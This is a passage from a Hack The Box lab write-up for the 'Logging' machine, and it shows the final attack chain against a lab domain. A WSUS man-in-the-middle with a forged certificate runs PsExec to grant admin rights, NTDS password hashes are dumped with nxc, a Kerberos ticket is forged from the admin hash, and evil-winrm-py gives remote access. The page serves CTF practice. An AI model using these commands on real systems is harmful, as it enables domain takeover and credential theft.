just following the POC ill convert the PFX to a PEM, now this can be used in wsuks to execute a command as the administrator</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo wsuks --WSUS-Server wsus.logging.htb --tls-cert wsus.pem -I tun0 --serve-only -c &#39;/accepteula /s powershell.exe &quot;net localgroup Administrators wallace.everette /add&quot;&#39;
+
+    __          __ _____  _    _  _  __  _____
+    \ \        / // ____|| |  | || |/ / / ____|
+     \ \  /\  / /| (___  | |  | || &#39; / | (___
+      \ \/  \/ /  \___ \ | |  | ||  &lt;   \___ \
+       \  /\  /   ____) || |__| || . \  ____) |
+        \/  \/   |_____/  \____/ |_|\_\|_____/
+
+     Pentesting Tool for the WSUS MITM Attack
+               Made by NeffIsBack
+                 version: 1.2.2
+
+[+] Command to execute: 
+PsExec64.exe /accepteula /s powershell.exe &quot;net localgroup Administrators wallace.everette /add&quot;
+[*] ===== Starting Web Server =====
+[*] Using TLS certificate &#39;wsus.pem&#39; for HTTPS WSUS Server
+[*] Starting WSUS Server on 10.10.14.61:8531...
+[*] Serving executable as KB: 9650056
+[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: &quot;http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetConfig&quot;
+[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: &quot;http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie&quot;
+[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: &quot;http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/SyncUpdates&quot;
+[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: &quot;http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie&quot;
+[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: &quot;http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetExtendedUpdateInfo&quot;
+[+] Received GET request: /2cead5a0-cde3-4389-9e62-2903f783d585/PsExec64.exe
+[+] GET request for exe: /2cead5a0-cde3-4389-9e62-2903f783d585/PsExec64.exe</code></pre><p>Ill run the command, then the service will run and make a connection back, its important to make sure you have your own IP in your <code>/etc/hosts</code> in the format <code>&lt;your IP&gt; wsus.logging.htb</code></p><p>After getting the connection it will have ran the command as SYSTEM</p><h2>Domain Admin</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.logging.htb -u &#39;wallace.everette&#39; -p &#39;Welcome2026@&#39;             
+SMB         10.129.245.130  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.245.130  445    DC01             [+] logging.htb\wallace.everette:Welcome2026@ (Pwn3d!)</code></pre><p>This user is now an Administrator</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nxc smb dc01.logging.htb -u &#39;wallace.everette&#39; -p &#39;Welcome2026@&#39; --ntds    
+SMB         10.129.245.130  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.245.130  445    DC01             [+] logging.htb\wallace.everette:Welcome2026@ (Pwn3d!)
+SMB         10.129.245.130  445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         10.129.245.130  445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:a0c1d1bed9126632f5f1f2b3f790bdb5:::
+SMB         10.129.245.130  445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.129.245.130  445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:66ff41c8e28783a47fd7617f1f0125f0:::
+SMB         10.129.245.130  445    DC01             logging.htb\svc_recovery:2104:aad3b435b51404eeaad3b435b51404ee:fbeb47c9c100020d3b9ebaf1ce839fb3:::
+SMB         10.129.245.130  445    DC01             logging.htb\jaylee.clifton:2105:aad3b435b51404eeaad3b435b51404ee:1abff5519c569c11dc713706b4a15ae0:::
+SMB         10.129.245.130  445    DC01             logging.htb\monique.chip:2106:aad3b435b51404eeaad3b435b51404ee:5595521651b7510b86438f7452606abf:::
+SMB         10.129.245.130  445    DC01             logging.htb\kyson.abel:2107:aad3b435b51404eeaad3b435b51404ee:a50981f25606aeaa0d442f0fcbbce699:::
+SMB         10.129.245.130  445    DC01             logging.htb\fable.milford:2108:aad3b435b51404eeaad3b435b51404ee:26a4b1da75600cdd7a3d77789d40a889:::
+SMB         10.129.245.130  445    DC01             logging.htb\wellington.kylan:2109:aad3b435b51404eeaad3b435b51404ee:20a6efc7a20a14021a717fa06cd250f8:::
+SMB         10.129.245.130  445    DC01             logging.htb\serina.philander:2110:aad3b435b51404eeaad3b435b51404ee:42961be97eb21e2fa7664b115e2ac3af:::
+SMB         10.129.245.130  445    DC01             logging.htb\wallace.everette:2111:aad3b435b51404eeaad3b435b51404ee:40e28a964e1a6a6512d0ebc70f1ca811:::
+SMB         10.129.245.130  445    DC01             logging.htb\toby.brynleigh:2112:aad3b435b51404eeaad3b435b51404ee:ac384497550a56937cd6edd784fb221c:::
+SMB         10.129.245.130  445    DC01             DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b4d05e08453f856b0ff4af1125157a84:::
+SMB         10.129.245.130  445    DC01             msa_health$:2113:aad3b435b51404eeaad3b435b51404ee:603fc24ee01a9409f83c9d1d701485c5:::
+SMB         10.129.245.130  445    DC01             [+] Dumped 14 NTDS hashes to /home/kali/.nxc/logs/ntds/DC01_10.129.245.130_2026-10-07_211450.ntds of which 12 were added to the database
+SMB         10.129.245.130  445    DC01             [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         10.129.245.130  445    DC01             [*] grep -iv disabled /home/kali/.nxc/logs/ntds/DC01_10.129.245.130_2026-10-07_211450.ntds | cut -d &#39;:&#39; -f1</code></pre><p><img src="images/logging/pasted-image-20261007211539.webp" alt="Screenshot" loading="lazy" /></p><p>Then i can dump the NTDS</p><p>However the administrator is in protected users so ill auth with kerberos and get a TGT then get remote access that way</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +7h nxc smb dc01.logging.htb -u &#39;Administrator&#39; -H &#39;a0c1d1bed9126632f5f1f2b3f790bdb5&#39; -k --generate-tgt DA
+SMB         dc01.logging.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc01.logging.htb 445    DC01             [+] logging.htb\Administrator:a0c1d1bed9126632f5f1f2b3f790bdb5 (Pwn3d!)
+SMB         dc01.logging.htb 445    DC01             [+] TGT saved to: DA.ccache
+SMB         dc01.logging.htb 445    DC01             [+] Run the following command to use the TGT: export KRB5CCNAME=DA.ccache
+
+❯❯❯ export KRB5CCNAME=DA.ccache
+
+❯❯❯ sudo nxc smb dc01.logging.htb --generate-krb5-file /etc/krb5.conf                                  
+[sudo] password for kali: 
+SMB         10.129.245.130  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.245.130  445    DC01             [+] krb5 conf saved to: /etc/krb5.conf
+SMB         10.129.245.130  445    DC01             [+] Run the following command to use the conf file: export KRB5_CONFIG=/etc/krb5.conf
+
+❯❯❯ export KRB5_CONFIG=/etc/krb5.conf</code></pre><p>Then ill use the DA hash from ntds to get a valid TGT then export it, and finally setup a realm and export it using nxc</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +7h evil-winrm-py -k --no-pass -i dc01.logging.htb
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | &#39; \| &#39;_| &#39;  |___| &#39;_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.6.0
+
+[*] Connecting to &#39;dc01.logging.htb:5985&#39; as &#39;Administrator@LOGGING.HTB&#39;
+evil-winrm-py PS C:\Users\Administrator\Documents&gt;</code></pre><p>Then i can auth as the domain admin after syncing with the clock</p><p>Domain Admin!</p><p>The alternative could have just been to auth as <code>toby.brynleig</code> since bloodhound says this user is also an Administrator</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Users\toby.brynleigh\Desktop&gt; dir
+
+
+    Directory: C:\Users\toby.brynleigh\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                   
+----                -------------         ------ ----                                                                   
+-ar---        10/7/2026   4:46 PM             34 root.txt                                                               
+
+
+evil-winrm-py PS C:\Users\toby.brynleigh\Desktop&gt;</code></pre><p>Then i can get the root flag</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-mirage/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">Mirage</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-infiltrator/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">Infiltrator</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
